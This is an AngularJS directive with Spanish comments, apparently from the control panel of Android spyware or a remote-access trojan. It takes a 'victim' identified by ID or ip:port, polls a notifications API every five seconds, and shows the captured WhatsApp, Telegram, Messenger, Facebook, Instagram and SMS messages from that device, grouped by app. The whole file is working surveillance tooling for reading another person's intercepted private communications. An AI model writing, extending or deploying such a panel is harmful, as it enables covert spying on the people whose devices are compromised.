// Directiva de notificaciones para AngularJS, usando el módulo principal "myappy"
angular.module('myappy')
  .directive('labNotifi', function() {
    return {
      restrict: 'E',
      scope: {
        victim: '='
      },
      template: `
        <div>
          <h4>Notificaciones (redes sociales, WhatsApp, etc.)</h4>
          <div ng-if="loading" class="ui active inline loader"></div>
          <div ng-if="error" class="ui red message">{{error}}</div>
          <div ng-if="grouped.length === 0 && !loading"><em>No hay notificaciones disponibles.</em></div>
          <div ng-repeat="group in grouped">
            <div ng-class="getHeaderClass(group.app)" class="p-2 mb-1 rounded">
              <strong>{{ getAppDisplayName(group.app) }}</strong>
            </div>
            <table class="ui celled table compact small">
              <thead>
                <tr>
                  <th>Título</th>
                  <th>Contenido</th>
                  <th>Dirección</th>
                  <th>Hora</th>
                </tr>
              </thead>
              <tbody>
                <tr ng-repeat="notif in group.notifications">
                  <td>{{ notif.title || '-' }}</td>
                  <td>
                    <span ng-if="notif.content">{{notif.content}}</span>
                    <span ng-if="notif.image"><br><img ng-src="{{notif.image}}" alt="imagen" style="max-width:150px;max-height:150px;"></span>
                  </td>
                  <td>
                    <span ng-if="notif.direction === 'sent'" class="ui green label">Enviado</span>
                    <span ng-if="notif.direction === 'received'" class="ui blue label">Recibido</span>
                    <span ng-if="!notif.direction">-</span>
                  </td>
                  <td>{{ notif.time | date:'short' }}</td>
                </tr>
              </tbody>
            </table>
          </div>
        </div>
      `,
      controller: function($scope, $http, $interval) {
        $scope.notifications = [];
        $scope.grouped = [];
        $scope.loading = false;
        $scope.error = "";

        // Mapeo para apps populares
        const appClassMap = {
          'WhatsApp': 'whatsapp-header',
          'Telegram': 'telegram-header',
          'Messenger': 'messenger-header',
          'Facebook': 'facebook-header',
          'Instagram': 'instagram-header',
          'SMS': 'sms-header'
        };

        // Traducción de nombre de paquete a nombre amigable
        const appNameMap = {
          'com.whatsapp': 'WhatsApp',
          'com.telegram': 'Telegram',
          'org.telegram.messenger': 'Telegram',
          'com.facebook.orca': 'Messenger',
          'com.facebook.katana': 'Facebook',
          'com.instagram.android': 'Instagram',
          'sms': 'SMS'
        };

        $scope.getAppDisplayName = function(app) {
          if (appNameMap[app]) return appNameMap[app];
          for (const key in appNameMap) {
            if (app.toLowerCase().includes(key)) return appNameMap[key];
          }
          return app;
        };

        $scope.getHeaderClass = function(appName) {
          for (const key in appClassMap) {
            if (appName.toLowerCase().includes(key.toLowerCase())) {
              return appClassMap[key];
            }
          }
          return 'default-header';
        };

        function groupByApp(notifs) {
          const groups = {};
          notifs.forEach(n => {
            const app = $scope.getAppDisplayName(n.app || 'Desconocida');
            if (!groups[app]) groups[app] = [];
            groups[app].push(n);
          });
          return Object.keys(groups).sort().map(app => ({
            app,
            notifications: groups[app].sort((a, b) => new Date(b.time) - new Date(a.time))
          }));
        }

        function fetchNotifications() {
          if (!$scope.victim) return;
          $scope.loading = true;
          $scope.error = "";
          var victimId = (
            $scope.victim && $scope.victim.id
          ) ? $scope.victim.id :
              (($scope.victim.ip && $scope.victim.port) ? ($scope.victim.ip + ":" + $scope.victim.port) : $scope.victim);

          victimId = String(victimId).trim();
          $http.get('/api/notifications/' + victimId).then(function(response) {
            $scope.notifications = response.data || [];
            $scope.grouped = groupByApp($scope.notifications);
            $scope.loading = false;
          }, function(err) {
            $scope.error = "No se pudieron cargar las notificaciones.";
            $scope.loading = false;
          });
        }

        fetchNotifications();
        var intervalPromise = $interval(fetchNotifications, 5000);

        $scope.$on('$destroy', function() {
          $interval.cancel(intervalPromise);
        });
      }
    };
  });